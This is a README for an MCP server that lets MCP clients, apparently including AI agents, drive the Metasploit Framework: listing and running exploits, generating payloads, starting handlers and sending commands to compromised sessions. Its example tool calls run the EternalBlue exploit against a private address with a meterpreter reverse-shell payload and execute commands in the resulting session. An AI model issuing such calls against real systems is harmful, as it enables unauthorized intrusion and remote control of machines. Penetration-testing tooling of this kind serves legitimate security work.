# Simplified Metasploit MCP Server

A clean, easy-to-use MCP (Model Context Protocol) server that provides comprehensive Metasploit functionality without the complexity of SSE/FastAPI.

## Features

- **Simple Setup**: Pure MCP implementation using stdio transport
- **Comprehensive Coverage**: All essential Metasploit functions
- **Easy Integration**: Works with any MCP-compatible client
- **Clean API**: JSON-based responses with clear error handling
- **No Web Dependencies**: No FastAPI/SSE complexity

## Available Tools

### Core Functions
- `list_exploits` - List available exploits with search filtering
- `list_payloads` - List available payloads with platform/arch filtering
- `get_exploit_info` - Get detailed information about specific exploits

### Exploitation
- `run_exploit` - Execute exploit modules with payload configuration
- `run_auxiliary` - Run auxiliary modules (scanners, etc.)
- `run_post_module` - Execute post-exploitation modules

### Session Management
- `list_sessions` - List all active sessions
- `interact_session` - Send commands to sessions and get output

### Payload Generation
- `generate_payload` - Generate payloads in various formats
- `start_handler` - Start payload handlers/listeners

### Job Management
- `list_jobs` - List active background jobs
- `stop_job` - Stop running jobs

## Prerequisites

1. **Metasploit Framework** installed and running
2. **msfrpcd** service running:
   ```bash
   msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
   ```

## Installation

1. Clone or download the server files
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

## Configuration

Set environment variables for Metasploit connection:

```bash
export MSF_PASSWORD="yourpassword"  # Default: msf
export MSF_SERVER="127.0.0.1"       # Default: 127.0.0.1
export MSF_PORT="55553"              # Default: 55553
export MSF_SSL="false"               # Default: false
```

## Usage

### Start the Server
```bash
python metasploit_mcp_server.py
```

The server will:
1. Test connection to Metasploit
2. Start the MCP server on stdio
3. Wait for client connections

### Example Usage (with MCP client)

```python
# List exploits containing "smb"
{
  "tool": "list_exploits",
  "arguments": {
    "search": "smb",
    "limit": 10
  }
}

# Get exploit information
{
  "tool": "get_exploit_info", 
  "arguments": {
    "exploit_name": "windows/smb/ms17_010_eternalblue"
  }
}

# Run an exploit
{
  "tool": "run_exploit",
  "arguments": {
    "exploit_name": "windows/smb/ms17_010_eternalblue",
    "target": "192.168.1.100",
    "payload": "windows/meterpreter/reverse_tcp",
    "lhost": "192.168.1.50",
    "lport": 4444
  }
}

# List active sessions
{
  "tool": "list_sessions",
  "arguments": {}
}

# Interact with a session
{
  "tool": "interact_session",
  "arguments": {
    "session_id": 1,
    "command": "sysinfo"
  }
}
```

## Tool Reference

### list_exploits
- **search** (optional): Filter exploits by name
- **limit** (optional): Max results (default: 50)

### list_payloads  
- **platform** (optional): Filter by platform (windows, linux, etc.)
- **arch** (optional): Filter by architecture (x86, x64, etc.)
- **limit** (optional): Max results (default: 50)

### run_exploit
- **exploit_name**: Name of exploit module
- **target**: Target IP/hostname
- **payload**: Payload to use
- **lhost**: Your IP for reverse connections
- **lport**: Your port for reverse connections
- **options** (optional): Additional exploit options

### run_auxiliary
- **module_name**: Name of auxiliary module
- **options**: Module options (RHOSTS, RPORT, etc.)

### interact_session
- **session_id**: ID of target session
- **command**: Command to execute

### generate_payload
- **payload_type**: Type of payload
- **format** (optional): Output format (exe, raw, python, etc.)
- **lhost**: Your IP
- **lport**: Your port
- **options** (optional): Additional payload options

### start_handler
- **payload_type**: Payload type to handle
- **lhost**: Listen IP
- **lport**: Listen port
- **options** (optional): Additional handler options

## Error Handling

All tools return JSON responses with:
- **Success**: Results in structured format
- **Errors**: Clear error messages with context

## Troubleshooting

1. **Connection Failed**: Check if msfrpcd is running and credentials are correct
2. **Module Not Found**: Verify module names match Metasploit's naming
3. **Permission Denied**: Ensure proper permissions for payload generation

## Security Notes

- Only run on trusted networks
- Use strong passwords for msfrpcd
- Consider firewall rules for RPC access
- Be aware of legal and ethical implications

## Differences from Original Server

This simplified version:
- ✅ Uses standard MCP stdio transport (no SSE complexity)
- ✅ Simpler codebase and maintenance
- ✅ JSON-only responses (no HTML/web interface)
- ✅ Direct pymetasploit3 integration
- ✅ Better error handling and logging
- ❌ No web interface or REST API
- ❌ No advanced session management features
- ❌ No payload file serving

## License

Use responsibly and in accordance with applicable laws and regulations. 